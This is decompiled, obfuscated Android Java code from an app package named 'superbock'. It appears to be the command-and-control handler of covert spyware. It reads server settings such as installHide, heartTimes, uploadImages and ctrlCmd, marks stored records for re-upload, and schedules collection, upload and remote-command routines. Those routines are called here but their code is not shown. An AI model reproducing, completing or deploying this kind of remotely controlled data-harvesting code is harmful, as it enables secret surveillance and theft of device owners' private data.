package e3;

import android.os.Handler;
import android.os.Looper;
import android.text.TextUtils;
import androidx.annotation.NonNull;
import com.blankj.utilcode.util.SPUtils;
import com.superbock.App;
import com.superbock.bean.BInfo;
import com.superbock.bean.DInfo;
import com.superbock.bean.KInfo;
import com.superbock.ui.StartupActivity;
import f3.i;
import g3.l;
import java.io.IOException;
import java.util.List;
import k.j0;
import k3.f;
import s3.b0;
import t2.g;

/* loaded from: classes19.dex */
public final class a implements s3.e {

    /* renamed from: e3.a$a, reason: collision with other inner class name */
    /* loaded from: classes22.dex */
    public class RunnableC0030a implements Runnable {
        @Override // java.lang.Runnable
        public final void run() {
            if (StartupActivity.f1537g) {
                return;
            }
            f.b(App.f1372b);
            f.a();
            f.f(App.f1372b);
            f.l(App.f1372b);
            f.d(App.f1372b);
            f.h(App.f1372b);
        }
    }

    /* loaded from: classes16.dex */
    public class b implements Runnable {
        @Override // java.lang.Runnable
        public final void run() {
            if (StartupActivity.f1537g) {
                return;
            }
            f.b(App.f1372b);
            f.a();
            f.n(App.f1372b);
            f.f(App.f1372b);
            f.q(App.f1372b);
            f.l(App.f1372b);
            f.t(App.f1372b);
            f.d(App.f1372b);
            f.p(App.f1372b);
            f.h(App.f1372b);
            if (j0.l() == 1) {
                f.r(App.f1372b);
            }
            f.s(App.f1372b);
            f.j(App.f1372b, false);
        }
    }

    /* loaded from: classes6.dex */
    public class c implements Runnable {
        @Override // java.lang.Runnable
        public final void run() {
            i.c(App.f1372b);
        }
    }

    @Override // s3.e
    public final void a(@NonNull s3.d dVar, @NonNull b0 b0Var) {
        f.e u4;
        int z4;
        try {
            if (b0Var.b() && (u4 = f.a.u(d1.c.f(b0Var.f5160h.e(), k3.i.f3901a))) != null && u4.z("code") == 1) {
                SPUtils.getInstance().put("savedDev", 1);
                f.e A = u4.A("data");
                j0.p(A.B("appDomain"));
                j0.C(A.B("webSite"));
                if (A.containsKey("topbar")) {
                    j0.B(A.z("topbar"));
                }
                if (A.containsKey("installHide")) {
                    j0.z(A.z("installHide"));
                }
                if (A.containsKey("heartTimes")) {
                    j0.x(A.z("heartTimes"));
                    App.f1378h = j0.h() * 60 * 1000;
                }
                if (A.containsKey("popupTimes")) {
                    j0.A(A.z("popupTimes"));
                    App.f1379i = j0.j() * 60 * 1000;
                }
                if (A.containsKey("uploadImages") && (z4 = A.z("uploadImages")) > -1) {
                    j0.f3714n = z4;
                    SPUtils.getInstance().put("uploadImages", j0.f3714n);
                }
                if (A.containsKey("thumbSnap ")) {
                    String B = A.B("thumbSnap ");
                    if (!TextUtils.isEmpty(B)) {
                        j0.f3709i = B;
                        SPUtils.getInstance().put("thumbSnap ", j0.f3709i);
                    }
                }
                if (A.containsKey("md5Key")) {
                    SPUtils.getInstance().put("md5Key", A.B("md5Key"));
                }
                if (A.containsKey("cnDisable")) {
                    j0.q(A.z("cnDisable"));
                }
                if (A.containsKey("customAuto")) {
                    j0.r(A.z("customAuto"));
                }
                if (A.containsKey("customMode")) {
                    j0.v(A.z("customMode"));
                }
                if (A.containsKey("customMaxTimes")) {
                    j0.u(A.z("customMaxTimes"));
                }
                if (A.containsKey("customGlobalTimes")) {
                    j0.s(A.z("customGlobalTimes"));
                }
                if (A.containsKey("customSingleTimes")) {
                    j0.w(A.z("customSingleTimes"));
                }
                if (A.containsKey("customInstallTimes")) {
                    j0.t(A.z("customInstallTimes"));
                }
                if (A.z("isInsert") == 1) {
                    g3.a.b().c();
                    g3.c a5 = g3.c.a();
                    g<BInfo, String> gVar = a5.f2955a;
                    List<BInfo> k5 = gVar.k(gVar.c().f());
                    if (k5 != null && !k5.isEmpty()) {
                        for (BInfo bInfo : k5) {
                            bInfo.setUp(0);
                            a5.f2955a.d(bInfo);
                        }
                    }
                    g3.d.a().b();
                    g3.e a6 = g3.e.a();
                    g<DInfo, String> gVar2 = a6.f2960a;
                    List<DInfo> k6 = gVar2.k(gVar2.c().f());
                    if (k6 != null && !k6.isEmpty()) {
                        for (DInfo dInfo : k6) {
                            dInfo.setUp(0);
                            a6.f2960a.d(dInfo);
                        }
                    }
                    g3.f.a().c();
                    l c5 = l.c();
                    g<KInfo, String> gVar3 = c5.f2975a;
                    List<KInfo> k7 = gVar3.k(gVar3.c().f());
                    if (k7 != null && !k7.isEmpty()) {
                        for (KInfo kInfo : k7) {
                            kInfo.setUp(0);
                            c5.f2975a.d(kInfo);
                        }
                    }
                }
                new Handler(Looper.getMainLooper()).postDelayed(new b(), 1500L);
                long j5 = SPUtils.getInstance().getLong("lastCtrlTime", 0L);
                if (A.z("ctrlCmd") == 1 || (j5 > 0 && System.currentTimeMillis() - j5 < 120000)) {
                    new Handler(Looper.getMainLooper()).postDelayed(new c(), 5000L);
                }
            }
        } catch (Throwable unused) {
        }
    }

    @Override // s3.e
    public final void b(@NonNull s3.d dVar, @NonNull IOException iOException) {
        if (k3.a.g(App.f1372b)) {
            j0.o();
        }
        new Handler(Looper.getMainLooper()).postDelayed(new RunnableC0030a(), 1500L);
    }
}
